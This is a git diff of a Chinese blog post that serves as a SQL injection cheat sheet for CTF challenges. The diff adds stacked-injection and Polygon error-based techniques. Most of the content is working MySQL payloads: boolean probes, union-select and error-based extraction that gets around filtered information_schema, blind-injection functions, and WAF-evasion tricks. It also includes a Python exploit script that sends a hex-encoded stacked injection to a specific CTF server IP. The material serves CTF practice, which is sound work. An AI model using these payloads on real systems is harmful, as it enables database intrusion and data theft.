@@ -6,13 +6,14 @@ tags:
 - 总结
 ---
 整理成为一个流程，这样以后帮助会很大, 以后慢慢也会继续添加内容.
-<!--more-->
+
 # 更新
-19.3.8->根据TAMUCTF2019的BirdBox更新布尔注入的探测payload:`' OR 1=1;-- -`
+19.3.8->根据TAMUCTF2019的BirdBox更新布尔注入的探测payload:`' OR 1=1;-- -`  
+19.5.28->增加堆叠注入、Polygon爆错
 
 # 总结
 
-**运算符号**
+**运算符号**  
 `_`代表空格
 ```sql
  - + * /(div) %(mod) 
@@ -39,7 +40,7 @@ name varchar(50) not null
 insert into users values(1,'j7ur8'),(2,'abc'),(3,'shirely'),(4,'apex');
 ```
 
-**过滤手法**
+**过滤手法**  
 双写(oorr)，大小写，内联注释，编码，等价替换，用户变量
 # select语句
 ```SQL
@@ -135,9 +136,8 @@ union select * from ( (select 1)a join (select PARAM from DATABASE.TABLE)b join 
 ```sql
 union(select*from(((select@1)a)join((select(group_concat(schema_name))from(information_schema.schemata))b)join((select@3)c)));
 ```
-- 过滤了information_schema.tables
+- 过滤了information_schema.tables(版本需要大于5.6)
 ```sql
-版本需要大于5.6
 union select * from ( (select 1)a join (select group_concat(table_name) from mysql.innodb_table_stats where database_name=schema() )b join (select 3)c )
 ```
 
@@ -177,7 +177,6 @@ select 1 from(select count(*),concat((select distinct concat(0x7e,schema_name,0x
 select 1 from(select count(*),concat((select distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a;
 select 1 from(select count(*),concat((select distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=TABLE LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a;
 select 1 from(select count(*),concat((select distinct concat(0x7e,COLUMN,0x7e) FROM DATABSE.TABLE LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a;
-
 ```
 
 - 过滤了information_schema
@@ -186,7 +185,7 @@ select 1 from(select count(*),concat((select distinct concat(0x7e,table_name,0x7
 ```
 
 - 过滤了rand函数
-```
+```sql
 select min(@a:=1) from information_schema.tables group by concat(version(),@a:=(@a+1)%2)
 ```
 
@@ -203,6 +202,8 @@ select (select(!x-~0)from(select(select user())x)a);
 select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
 select *  from(select * from TABLE a join TABLE b)c;
 select *  from(select * from TABLE a join TABLE b using(COLUMN,COLUMN.....))c;
+基于字段名
+select * from user where ID=1 and Polygon(ID)
 ```
 
 **布尔注入和盲注**
@@ -217,6 +218,7 @@ select *  from(select * from TABLE a join TABLE b using(COLUMN,COLUMN.....))c;
  = <>(!=) > < <= >= between not_between in not_in <=> like regexp rlike is_null is_not_null
  not(!) and or xor & | ^ << >> ~
 ```
+
 - 语句有`if`,`case when then else end`
 
 - 字符串截取函数
@@ -344,6 +346,36 @@ assignment_list:
 单表的sql注入,获取本表的内容:
 update users set username = 'j7ur8'| conv(hex(substr((select username from (select * from users where id=1) as x limit 0,1 ) ,1 + (1-1) * 8, 8 * 1)),16, 10) where id=1;
 update users set username = '0'| conv(hex(substr((select username from (select * from users where id=1) as x limit 0,1 ) ,1 + (1-1) * 8, 8 * 1)),16, 10) where id=1;
+```
+
+# 堆叠注入
+碰到过的实际案例是强网杯的`随便注`这道题目。题目过滤了select，所以基本以上所有的查询都不可行了，因此考虑了堆叠注入。
+探测的语句：
+```sql
+1';show tables;#
+#给了tables的回显就说明存在
+```
+据说堆叠注入是不会给回显的，但是当时这道题目提示的是开发与渗透同样重要....可能是开发做的有问题吧。
+
+堆叠注入的基本语句
+```sql
+sEt @x=0x??????;
+prEpare a from @x;
+execute a;
+```
+
+强网杯的exp.py
+```py
+import requests
+import binascii
+s = 'insert into words values (1,(select group_concat(`flag`) from `1919810931114514` limit 0,1))'
+# s = 'insert into 1919810931114514 values ("123456")'
+# s = 'insert into words values (1,2)'
+str_16 = binascii.b2a_hex(s.encode('utf-8'))
+inject = str_16.decode()
+print(f"http://49.4.15.125:31896/?inject=1';sEt @x=0x{inject};prEpare a from @x;execute a;")
+s = requests.get(f"http://49.4.15.125:31896/?inject=1';sEt @x=0x{inject};prEpare a from @x;execute a;")
+print(s.text)
 ```
 
 # 过狗方面
